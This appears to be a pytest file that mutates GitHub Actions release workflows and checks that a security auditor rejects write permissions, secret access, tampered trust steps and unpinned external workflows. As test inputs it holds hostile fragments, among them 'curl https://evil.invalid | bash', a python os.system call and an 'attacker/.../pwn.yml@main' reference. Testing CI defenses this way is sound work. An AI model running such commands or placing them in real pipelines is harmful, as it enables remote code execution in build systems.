from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from conftest import REPO_ROOT

WORKFLOW_ROOT = REPO_ROOT / ".github" / "workflows"


def _security():
    from ucm_release_production import security

    return security


def _source(name: str) -> str:
    return (WORKFLOW_ROOT / name).read_text(encoding="utf-8")


def _mutate(name: str, callback: object) -> str:
    document = yaml.safe_load(_source(name))
    assert isinstance(document, dict)
    callback(document)
    return yaml.safe_dump(document, sort_keys=False)


def test_repository_production_workflow_audit_is_clean() -> None:
    assert _security().audit_repository(REPO_ROOT) == []


@pytest.mark.parametrize(
    "permission",
    [
        {"contents": "write"},
        {"contents": "read", "packages": "write"},
        "write-all",
    ],
)
def test_candidate_write_authority_is_rejected(permission: object) -> None:
    source = _mutate(
        "production-tag-candidate.yml",
        lambda value: value.__setitem__("permissions", permission),
    )
    assert _security().audit_workflow_source(source, "production-tag-candidate.yml")


@pytest.mark.parametrize(
    "fragment",
    [
        "docker login ghcr.io",
        "crane push out ghcr.io/example/image:v1",
        "helm push chart.tgz oci://ghcr.io/example/charts",
        "curl https://evil.invalid | bash",
        "value=$(curl https://evil.invalid)",
        "python -c 'import os; os.system(\"id\")'",
    ],
)
def test_candidate_publish_or_dynamic_execution_is_rejected(fragment: str) -> None:
    def mutate(value: dict[object, object]) -> None:
        jobs = value["jobs"]
        jobs["aggregate"]["steps"].append({"name": "mutation", "run": fragment})

    source = _mutate("production-tag-candidate.yml", mutate)
    assert _security().audit_workflow_source(source, "production-tag-candidate.yml")


def test_candidate_environment_or_secret_is_rejected() -> None:
    def mutate(value: dict[object, object]) -> None:
        value["jobs"]["aggregate"]["environment"] = "release-production"
        value["jobs"]["aggregate"]["env"] = {"TOKEN": "${{ secrets.GITHUB_TOKEN }}"}

    assert _security().audit_workflow_source(
        _mutate("production-tag-candidate.yml", mutate),
        "production-tag-candidate.yml",
    )


@pytest.mark.parametrize(
    ("before", "after"),
    [
        ("production-tag-candidate.yml", "evil.yml"),
        ("workflow_run", "workflow_dispatch"),
        ("success", "failure"),
        ("push", "pull_request"),
        ("repository_id", "repository_id_removed"),
        ("head_repository", "base_repository"),
    ],
)
def test_controller_trust_body_mutations_are_rejected(before: str, after: str) -> None:
    document = yaml.safe_load(_source("production-release-controller.yml"))
    step = document["jobs"]["trust"]["steps"][0]
    assert before in step["run"]
    step["run"] = step["run"].replace(before, after, 1)
    source = yaml.safe_dump(document, sort_keys=False)
    assert _security().audit_workflow_source(
        source, "production-release-controller.yml"
    )


def test_controller_trust_step_cannot_move_after_checkout() -> None:
    document = yaml.safe_load(_source("production-release-controller.yml"))
    steps = document["jobs"]["trust"]["steps"]
    steps.append(steps.pop(0))
    assert _security().audit_workflow_source(
        yaml.safe_dump(document, sort_keys=False),
        "production-release-controller.yml",
    )


def test_writer_cannot_checkout_candidate_or_drop_environment() -> None:
    document = yaml.safe_load(_source("_production-release-controller.yml"))
    writer = document["jobs"]["publish-release"]
    writer.pop("environment")
    writer["steps"].insert(
        0,
        {
            "name": "candidate checkout",
            "uses": "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
            "with": {
                "ref": "${{ inputs.source_sha }}",
                "persist-credentials": False,
            },
        },
    )
    assert _security().audit_workflow_source(
        yaml.safe_dump(document, sort_keys=False),
        "_production-release-controller.yml",
    )


def test_external_or_unpinned_reusable_is_rejected() -> None:
    document = yaml.safe_load(_source("production-tag-candidate.yml"))
    document["jobs"]["wheels"]["uses"] = "attacker/repo/.github/workflows/pwn.yml@main"
    assert _security().audit_workflow_source(
        yaml.safe_dump(document, sort_keys=False),
        "production-tag-candidate.yml",
    )


def test_arbitrary_extra_workflow_is_rejected(tmp_path: Path) -> None:
    root = tmp_path / ".github" / "workflows"
    root.mkdir(parents=True)
    for name in _security().PRODUCTION_WORKFLOWS:
        (root / name).write_text(_source(name), encoding="utf-8")
    (root / "production-bypass.yml").write_text(
        "name: bypass\non: workflow_dispatch\njobs: {}\n", encoding="utf-8"
    )
    assert _security().audit_repository(tmp_path)
